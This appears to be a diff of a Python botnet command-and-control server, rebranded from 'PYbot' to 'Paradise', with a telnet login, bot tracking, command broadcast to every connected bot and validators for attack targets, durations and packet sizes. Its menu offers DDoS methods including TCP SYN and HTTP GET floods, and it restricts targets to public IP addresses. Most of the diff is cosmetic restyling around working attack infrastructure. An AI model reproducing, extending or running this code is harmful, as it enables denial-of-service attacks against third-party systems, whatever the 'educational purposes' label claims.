@@ -1,62 +1,68 @@
 #!/usr/bin/env python3
 #-*- coding: utf-8 -*-
 # CNC Server
+#    ___       ___       ___       ___       ___       ___       ___       ___   
+#   /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \  
+#  /::\  \   /::\  \   /::\  \   /::\  \   /::\  \   _\:\  \   /::\  \   /::\  \ 
+# /::\:\__\ /::\:\__\ /::\:\__\ /::\:\__\ /:/\:\__\ /\/::\__\ /\:\:\__\ /::\:\__\
+# \/\::/  / \/\::/  / \;:::/  / \/\::/  / \:\/:/  / \::/\/__/ \:\:\/__/ \:\:\/  /
+#    \/__/    /:/  /   |:\/__/    /:/  /   \::/  /   \:\__\    \::/  /   \:\/  / 
+#             \/__/     \|__|     \/__/     \/__/     \/__/     \/__/     \/__/  
 
-# Lib
-import socket
-import threading
-import sys
-import time
-import ipaddress
-from colorama import Fore, init, ipaddress
+# Libraries
+import socket, threading, sys, time, ipaddress
+from colorama import Fore, init
+
+about = """
+┌────────────────────────────┐
+│ * Author : D3fe4ted        │
+│ * Coded in Python          │
+│ * For educational purposes │
+└────────────────────────────┘"""
 
 bots = {}
 ansi_clear = '\033[2J\033[H'
 
-banner = '''\x1b[0;38;2;0;255;255m                                  ▄ •▄ ▄▄▄ . ▐ ▄       .▄▄ · 
-\x1b[0;38;2;0;246;255m                                  █▌▄▌▪▀▄.▀·•█▌▐█▪     ▐█ ▀. 
-\x1b[0;38;2;0;237;255m                                  ▐▀▀▄·▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄
-\x1b[0;38;2;0;228;255m                                  ▐█.█▌▐█▄▄▌██▐█▌▐█▌.▐▌▐█▄▪▐█
-\x1b[0;38;2;0;219;255m                                  ·▀  ▀ ▀▀▀ ▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  \x1b[0mLITE'''
+banner = """Welcome to Paradise. Enjoy your stay!\n"""
 
+# Validate IP
 def validate_ip(ip):
-    # Validate IP
     parts = ip.split('.')
     return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
-    
+
+# Validate Port
 def validate_port(port, rand=False):
-    # Validate port
     if rand:
         return port.isdigit() and int(port) >= 0 and int(port) <= 65535
     else:
         return port.isdigit() and int(port) >= 1 and int(port) <= 65535
 
+# Validate attack time
 def validate_time(time):
-    # Validate attack time
     return time.isdigit() and int(time) >= 10 and int(time) <= 1300
 
+# Validate buffer size
 def validate_size(size):
-    # Validate buffer size
     return size.isdigit() and int(size) > 1 and int(size) <= 65500
 
+# Read credentials from login file
 def find_login(username, password):
-    # Read credentials from login file
     credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
     for x in credentials:
         c_username, c_password = x.split(':')
         if c_username.lower() == username.lower() and c_password == password:
             return True
 
+# Send data to client or bot
 def send(socket, data, escape=True, reset=True):
-    # Send data to client or bot
     if reset:
         data += Fore.RESET
     if escape:
         data += '\r\n'
     socket.send(data.encode())
 
+# Send command to all bots
 def broadcast(data):
-    # Send command to all bots
     dead_bots = []
     for bot in bots.keys():
         try:
@@ -67,8 +73,8 @@ def broadcast(data):
         bots.pop(bot)
         bot.close()
 
+# Check if all bots are still connected to C2
 def ping():
-    # Check if all bots are still connected to C2
     while 1:
         dead_bots = []
         for bot in bots.keys():
@@ -85,8 +91,8 @@ def ping():
             bot.close()
         time.sleep(5)
 
+# Updates Shell Title
 def update_title(client, username):
-    """ updates the shell title, duh? """
     while 1:
         try:
             send(client, f'\33]0;KENOS LITE | NPCS: {len(bots)} | Logged in as: {username}\a', False)
@@ -94,11 +100,12 @@ def update_title(client, username):
         except:
             client.close()
 
+# Telnet Command Line
 def command_line(client):
     for x in banner.split('\n'):
         send(client, x)
 
-    prompt = f'{Fore.LIGHTBLUE_EX}PYbot {Fore.LIGHTWHITE_EX}$ '
+    prompt = f'{Fore.LIGHTBLUE_EX}Paradise {Fore.LIGHTWHITE_EX}$ '
     send(client, prompt, False)
 
     while 1:
@@ -111,13 +118,8 @@ def command_line(client):
             command = args[0].upper()
             
             if command == 'ABOUT':
-                send(client, '┌────────────────────────────┐')
-                send(client, '│ * Author : D3fe4ted        │')
-                send(client, '│ * Coded in Python          │')
-                send(client, '│ * For educational purposes │')
-                send(client, '└────────────────────────────┘')
+                send(client, about)
                 send(client, '')
-
             if command == 'HELP':
                 send(client, '┌───────────────────────────────────────┐')
                 send(client, '│ HELP: Shows list of commands          │')
@@ -126,7 +128,6 @@ def command_line(client):
                 send(client, '│ LOGOUT: Disconnects from CnC server   │')
                 send(client, '└───────────────────────────────────────┘')
                 send(client, '')
-
             elif command == 'METHODS':
                 send(client, '┌─────────────────────────────────────────────────┐')
                 send(client, '│ * .syn - TCP SYN Flood                          │')
@@ -136,12 +137,10 @@ def command_line(client):
                 send(client, '│ * .http - HTTP GET Request Flood                │')
                 send(client, '└─────────────────────────────────────────────────┘')
                 send(client, '')
-
             elif command == 'CLEAR':
                 send(client, ansi_clear, False)
                 for x in banner.split('\n'):
                     send(client, x)
-
             elif command == 'LOGOUT':
                 send(client, '* Successfully Logged out\n\nSession Ended\n')
                 time.sleep(1)
@@ -260,10 +259,9 @@ def command_line(client):
             break
     client.close()
 
+# Username login
 def handle_client(client, address):
-    send(client, f'\33]0;PYbot | Login\a', False)
-
-    # username login
+    send(client, f'\33]0;Paradise | Login\a', False)
     while 1:
         send(client, ansi_clear, False)
         send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
@@ -305,7 +303,7 @@ def handle_client(client, address):
     
 def main():
     if len(sys.argv) != 2:
-        print(f'Usage: python {sys.argv[0]} <c2 port>')
+        print(f'Usage: python3 {sys.argv[0]} <c2 port>')
         exit()
 
     port = sys.argv[1]
